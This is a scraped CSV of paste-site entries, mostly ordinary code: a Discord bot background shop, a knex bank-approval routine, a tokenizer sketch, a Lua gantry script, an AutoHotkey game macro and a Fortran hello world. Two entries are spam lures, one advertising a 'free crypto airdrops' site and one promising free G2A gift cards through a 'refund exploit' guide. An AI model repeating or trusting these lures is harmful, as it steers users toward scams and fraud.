id,title,username,language,date,content
1EAtPgHK,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Sunday 21st of January 2024 11:46:00 PM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

825215"
StBS1AS2,scuffed,fearmoabs,JavaScript,Sunday 21st of January 2024 11:45:28 PM CDT,"  if (interaction.commandName === ""background"") {
    if (!interaction.inGuild()) {
      interaction.reply({
        content: ""You can only run commands in servers"",
        ephemeral: true,
      });
      return;
    }
    const { member, guild } = interaction;
    const choice = interaction.options.get(""choice"");
    const Data = await levelSchema.findOne({
      Guild: guild.id,
      User: member.id,
    });
    console.log(choice);
    if (
      choice === null &&
      Data.Bg1 === 1 &&
      Data.Bg2 === 1 &&
      Data.Bg3 === 1 &&
      Data.Bg4 === 1 &&
      Data.Bg5 === 1
    ) {
      interaction.reply(""You own every background! stay tuned, more to come!"");
      return;
    }
    if (choice === null) {
      const bgb = new AttachmentBuilder(""./bgs/bgb.png"", {
        name: ""bgb.png"",
      });
      const bgbe = new EmbedBuilder()
        .setColor(""#00FFFF"")
        .setDescription(
          `blue style, **costs 5,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""1""** inside the choices`
        );

      const bgbw = new AttachmentBuilder(""./bgs/bgbw.png"", {
        name: ""bgbw.png"",
      });
      const bgbwe = new EmbedBuilder()
        .setColor(""#000000"")
        .setDescription(
          `black and white style, **costs 10,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""2""** inside the choices`
        );

      const bgd = new AttachmentBuilder(""./bgs/bgd.png"", {
        name: ""bgd.png"",
      });
      const bgde = new EmbedBuilder()
        .setColor(""#FF0000"")
        .setDescription(
          `red moon style, **costs 10,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""3""** inside the choices`
        );

      const bgp = new AttachmentBuilder(""./bgs/bgp.png"", {
        name: ""bgp.png"",
      });
      const bgpe = new EmbedBuilder()
        .setColor(""#A020F0"")
        .setDescription(
          `purple style, **costs 5,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""4""** inside the choices`
        );

      const bgs = new AttachmentBuilder(""./bgs/bgs.png"", {
        name: ""bgs.png"",
      });
      const bgse = new EmbedBuilder()
        .setColor(""#FFC0CB"")
        .setDescription(
          `vibrant nature art style, **costs 25,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""5""** inside the choices`
        );

      await interaction.reply({
        embeds: [bgbe],
        files: [bgb],
      });

      setTimeout(async () => {
        await interaction.editReply({
          embeds: [bgbwe],
          files: [bgbw],
        });
      }, 3000);
      setTimeout(async () => {
        await interaction.editReply({
          embeds: [bgde],
          files: [bgd],
        });
      }, 7000);
      setTimeout(async () => {
        await interaction.editReply({
          embeds: [bgpe],
          files: [bgp],
        });
      }, 12000);
      setTimeout(async () => {
        await interaction.editReply({
          embeds: [bgse],
          files: [bgs],
        });
      }, 18000);
      return;
    }
    if (choice.value === 1) {
      if (Data.Background === ""blue"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg1 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""blue"";
        await Data.save();
        return;
      }
      if (Data.Cash < 5000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 5000;
        Data.Bg1 = 1;
        Data.Background = ""blue"";
        await Data.save();
        interaction.reply(
          ""youve purchased the blue style background for 5,000$""
        );
      }
    }
    if (choice.value === 2) {
      if (Data.Background === ""bandw"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg2 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""bandw"";
        await Data.save();
        return;
      }
      if (Data.Cash < 10000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 10000;
        Data.Background = ""bandw"";
        Data.Bg2 = 1;
        await Data.save();
        interaction.reply(
          ""youve purchased the black and white style background for 10,000$""
        );
      }
    }

    if (choice.value === 3) {
      if (Data.Background === ""def"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg3 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""def"";
        await Data.save();
        return;
      }
      if (Data.Cash < 10000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 10000;
        Data.Background = ""def"";
        Data.Bg3 = 1;
        await Data.save();
        interaction.reply(
          ""youve purchased the red moon style style background for 10,000$""
        );
      }
    }
    if (choice.value === 4) {
      if (Data.Background === ""purp"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg4 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""purp"";
        await Data.save();
        return;
      }
      if (Data.Cash < 5000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 5000;
        Data.Background = ""purp"";
        Data.Bg4 = 1;
        await Data.save();
        interaction.reply(
          ""youve purchased the purple style style background for 5,000$""
        );
      }
    }
    if (choice.value === 5) {
      if (Data.Background === ""trees"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg1 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""trees"";
        await Data.save();
        return;
      }
      if (Data.Cash < 25000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 25000;
        Data.Background = ""trees"";
        Data.Bg5 = 1;
        await Data.save();
        interaction.reply(
          ""youve purchased the vibrant nature art style background for 25,000$""
        );
      }
    }
  }"
p1EiXgTp,Untitled,ma39isy,JavaScript,Sunday 21st of January 2024 11:25:12 PM CDT,"const dataMasterPermohonanquery = knex('master_permohonan as mp')
        .select('mp.*', 'res.id_elevation', 'res.kode_aksi', 'ra.nama', 'res.tanggal_approve', 'res.pemutus', 'res.catatan as catatan', 'res.update_is_direksi')
        .leftJoin('ref_elevation_status as res', 'res.id_ref_status','mp.status')
        .leftJoin('ref_action as ra', 'ra.kode_aksi', 'res.kode_aksi')
        .where('mp.id', requestBody.idPermohonan)
        .where('res.kode_aksi', requestBody.kodeAksi)

const dataMasterPermohonan = await dataMasterPermohonanquery
        .first()

        let update_catatan = dataMasterPermohonan.catatan
        let update_pemutus = dataMasterPermohonan.pemutus
        let tanggal_approve = dataMasterPermohonan.tanggal_approve
           

            if (dataMasterPermohonan.update_is_direksi === true) {
                if(dataMasterPermohonan.status === 15){
                    dataMasterPermohonanquery.where('master_permohonan.is_direksi', knex.raw('ref_elevation_status.check_direksi'));
                    const tes = await dataMasterPermohonanquery.first()
                    console.log(tes)
                }

                await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    [update_pemutus]: user.FullName, 
                    is_direksi:requestBody.isDireksi, 
                    [tanggal_approve] : currentDate
                });
               
                if (dataMasterPermohonan.id_elevation === 7) {
                    const innerDataMasterPermohonan = await knex('master_permohonan as mp')
                           .select(
                               'mp.id', 
                               'mp.no_rekening', 
                               'mp.nama_nasabah', 
                               'mp.nominal', 
                               'mp.eq', 
                               'mp.nisbah', 
                               'mp.tanggal', 
                               'mp.idcabang', 
                               'mp.idinduk', 
                               'rj.jangka_waktu', 
                               'rj.hari', 
                               'rs.status', 
                               'rs.id as idstatus', 
                               knex.raw(`
                                   case
                                       when mp.jenis_permohonan = 1
                                       then 'Penempatan Baru'
   
                                       else 'Perpanjangan'
                                   end as pengajuan
                               `),
                               knex.raw(`
                                   case 
                                       when mp.jenis_kepemilikan = 1 
                                       then 'Ritel'
   
                                       else 'Korporasi'
                                   end as pemilik
                               `), 
                               knex.raw(`
                                   case 
                                       when jenis_deposito = 1 
                                       then 'Bagi Hasil'
   
                                       else 'Jualah'
                                   end as deposito
                               `)
                           )
                           .leftJoin('ref_jangka as rj', 'rj.id', 'mp.idjangka')
                           .leftJoin('ref_status as rs', 'rs.id', 'mp.status')
                           .where('mp.id', '=', requestBody.idPermohonan)
                           .first();
   
                       const innerDataMasterEmail = await knex('master_email as me')
                           .leftJoin('master_permohonan as mp', 'mp.id', 'me.id_pemohon')
                           .where('me.id_pemohon', '=', requestBody.idPermohonan)
                           .select('me.email')
                           .first();
   
                       console.log('innerDataMasterEmail.email : ', innerDataMasterEmail.email);
                       const innerCcEmail = innerDataMasterEmail.email.split(',');
                       console.log('innerccEmail : ', innerCcEmail);
   
                       const htmlTemplate = `
                           <html>
                               <body>
                                   <p><i><strong> Assalamualaikum wr wb </strong></i></p>
                                   <p> Berikut data permohonan special nisbah : </p>
                                   </br>
                                   <p> Jenis Permohonan : ${innerDataMasterPermohonan.pengajuan} </p>
                                   <p> Segmentasi : ${innerDataMasterPermohonan.pemilik} </p>
                                   <p> Jenis Deposito : ${innerDataMasterPermohonan.deposito} </p>
                                   <p> Nama Nasabah : ${innerDataMasterPermohonan.nama_nasabah} </p>
                                   <p> Nominal : ${innerDataMasterPermohonan.nominal.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, ""$1,"")} </p>
                                   <p> Jangka Waktu : ${innerDataMasterPermohonan.jangka_waktu} </p>
                                   <p> Nisbah : ${innerDataMasterPermohonan.nisbah} % </p>
                                   <p> Indikasi E.q rate dimohon : ${innerDataMasterPermohonan.eq} % </p>
                                   <p> Email ini dibuat secara otomatis. Mohon tidak mengirimkan balasan ke email ini. </p>
                                   </br>
                                   <p><i><strong> Wassalamualaikum wr wb </strong></i></p>
                                   <p> Bank BJB Syariah </p>
                               </body>
                           </html>
                       `;
   
                       await kirimEmail(
                           innerCcEmail, 
                           innerCcEmail, 
                           'SPECIAL NISBAH IB MASLAHAH', 
                           htmlTemplate
                       );
                }
            }else{
                if(dataMasterPermohonan.kode_aksi === 'A'){
                    await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    [update_pemutus]: user.FullName, 
                    [tanggal_approve] : currentDate
                    });
                    
                }else{
                    await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    });

                }
            }"
p7sgxfU5,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Sunday 21st of January 2024 11:07:31 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_835269.pdf
 
Working as of
22 January 2024"
UDEHjYPk,Untitled,Tkap1,JavaScript,Sunday 21st of January 2024 11:05:26 PM CDT,"

class Tokenizer
{
	tokens = [];
	index = 0;
	consume_type_text(type, text) {
		if(tokens[index].type === type && tokens[index].text === text) {
			index += 1;
			return tokens[index - 1];
		}
		return null;
	}
	consume_type(type)
	{
		if(tokens[index].type === type) {
			index += 1;
			return tokens[index - 1];
		}
		return null;
	}
};


function parseTag(tokenizer) {
	if(!tokenizer.consume_type_text(""symbol"", ""<"")) { return {null, null}; }

	let token = tokenizer.consume_type(""identifier"", ""<"")
	if(token === null) { return {null, null}; }

	// ...
	// On success, something like
	return {node, tokenizer}

}

function parse(tokens) {
	let tokenizer = new Tokenizer();
	tokenizer.tokens = tokens;
	tokenizer.index = 0;

	// We don't want to pass a reference, because it will get modified even it we don't successfully parse a tag.
	parseTag({...tokenizer});
}"
StzRGDM3,Senju,PapiGemezs,PHP,Sunday 21st of January 2024 11:00:27 PM CDT,"{
   ""Senju"": [
      {
         ""version"": 1.1
      }
   ]
}"
swuVQA6y,smarter main,Claire9201,Lua,Sunday 21st of January 2024 10:59:01 PM CDT,"local motor = peripheral.wrap(""back"")


local DEBUG = true


local GRIDMULTX = 4
local GRIDMULTZ = 8


local currentPosition = {0,0,0}


local stickersEnabled = false


function toggleStickers()
  redstone.setOutput(""top"",true)
  sleep(0.5)
  redstone.setOutput(""top"",false)
  sleep(0.5)
  
  stickersEnabled = not stickersEnabled

  if DEBUG then
    print(""toggled stickers, state: "" .. tostring(stickersEnabled))
  end
end

function resetOutputs()
  redstone.setOutput(""left"",false)
  redstone.setOutput(""right"",false)
  
  if DEBUG then
    print(""reset outputs"")
  end
end

function waitTilFinished()
  repeat sleep(0.1) until not motor.isRunning()
  sleep(1)
  
  if DEBUG then
    print(""movement finished"")
  end
end


function newMoveX(targetX)

  print(targetX)
  print(currentPosition[1])

  local movement = targetX-currentPosition[1]
  print(movement)
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  print(movement)
  print(math.abs(movement))
  print(movementType)

  resetOutputs()
  redstone.setOutput(""left"",true)
  sleep(.5)
  if DEBUG then
    print(""moving X"")
  end
  motor.move(math.abs(movement),-movementType)
  currentPosition[1] = currentPosition[1]+movement
  waitTilFinished()

end
function newMoveY(targetY)

  local movement = targetY-currentPosition[2]
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  resetOutputs()
  redstone.setOutput(""left"",true)
  redstone.setOutput(""right"",true)
  sleep(.5)
  if DEBUG then
    print(""moving Y"")
  end
  motor.move(math.abs(movement),movementType)
  currentPosition[2] = currentPosition[2]+movement
  waitTilFinished()

end
function newMoveZ(targetZ)

  local movement = targetZ-currentPosition[3]
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  resetOutputs()
  sleep(.5)
  if DEBUG then
    print(""moving Z"")
  end
  motor.move(math.abs(movement),movementType)
  currentPosition[3] = currentPosition[3]+movement
  waitTilFinished()

end


function moveX(movement,direction)
  resetOutputs()
  redstone.setOutput(""left"",true)
  sleep(.5)
  if DEBUG then
    print(""moving X"")
  end
  motor.move(movement,-direction)
  currentPosition[1] = currentPosition[1]+(movement*-direction)
  waitTilFinished()
end

function moveZ(movement,direction)
  resetOutputs()
  sleep(.5)
  if DEBUG then
    print(""moving Z"")
  end
  motor.move(movement,direction)
  currentPosition[3] = currentPosition[3]+(movement*direction)
  waitTilFinished()
end

function moveY(movement,direction)
  resetOutputs()
  redstone.setOutput(""left"",true)
  redstone.setOutput(""right"",true)
  sleep(.5)
  if DEBUG then
    print(""moving Y"")
  end
  motor.move(movement,direction)
  currentPosition[2] = currentPosition[2]+(movement*direction)
  waitTilFinished()
end


function resetGantry()
  
  if not redstone.getInput(""bottom"") then
    moveY(11,-1)
  end
  
  while not redstone.getInput(""bottom"") do
    if not redstone.getInput(""bottom"") then
      moveX(6,-1)
    end
    if not redstone.getInput(""bottom"") then
      moveZ(6,-1)
    end
  end

  currentPosition = {0,0,0}

  if DEBUG then
    print(""reset gantry"")
  end

end


function moveToPoint(x,y,z)
  
  if DEBUG then
    print(""moving to point: ("".. tostring(x) .. "", "" .. tostring(y) .. "", "" .. tostring(z) .. "")"")
  end

  newMoveX((x-1)*GRIDMULTX)
  newMoveZ((z-1)*GRIDMULTZ)
  newMoveY(y)

end


function grabContainer()

  if stickersEnabled then
    toggleStickers()
  end

  newMoveY(11)
  
  if not stickersEnabled then
    toggleStickers()
  end
  
  newMoveY(0)

end

function dropContainer()

  if not stickersEnabled then
    toggleStickers()
  end

  newMoveY(11)
  
  if stickersEnabled then
    toggleStickers()
  end
  
  newMoveY(0)

end


function grabContainerAt(x,z)

  moveToPoint(x,0,z)
  grabContainer()

end

function dropContainerAt(x,z)

  moveToPoint(x,0,z)
  dropContainer()

end

function printCurrentPosition()
  print(currentPosition[1])
  print(currentPosition[2])
  print(currentPosition[3])
end

function moveContainerTo(x1,z1,x2,z2)

  grabContainerAt(x1,z1)
  dropContainerAt(x2,z2)

end


resetGantry()
moveContainerTo(2,3,1,2)"
cSrVbMb4,Pet Simulator 99 Auto Fish v3,Killyoboy,Autohotkey,Sunday 21st of January 2024 10:56:34 PM CDT,"#MaxThreadsPerHotKey, 2
Toggle := 0
 
F1::
Toggle := !Toggle
 
While (Toggle) {
    Click
    Sleep, 3000
    Click
    Sleep, 100
    PixelSearch, tapX, tapY, 1499, 246, 1499, 872, 0x000000, 1, fast, RGB

    If (tapX) {
        While (tapX && Toggle) {
            Click
            Sleep, 10
            PixelSearch, tapX, tapY, 1499, 246, 1499, 872, 0x000000, 1, fast, RGB
        }
    }
}"
4tkzZ2jK,Mad,Unknown_No_1,PHP,Sunday 21st of January 2024 10:41:13 PM CDT,KalpoHatersByMad
Luz3nV2w,program fortran pertamaku,paperline27,Fortran,Sunday 21st of January 2024 10:20:26 PM CDT,"program HelloWorld
  ! Ini adalah program Hello, World! dalam Fortran
  
  ! Deklarasi pernyataan
  implicit none
  
  ! Bagian utama program
  write(*,*) 'Hello, World!'
  
end program HelloWorld

! jalankan program
! gfortran hello.f90 -o hello
! ./hello"
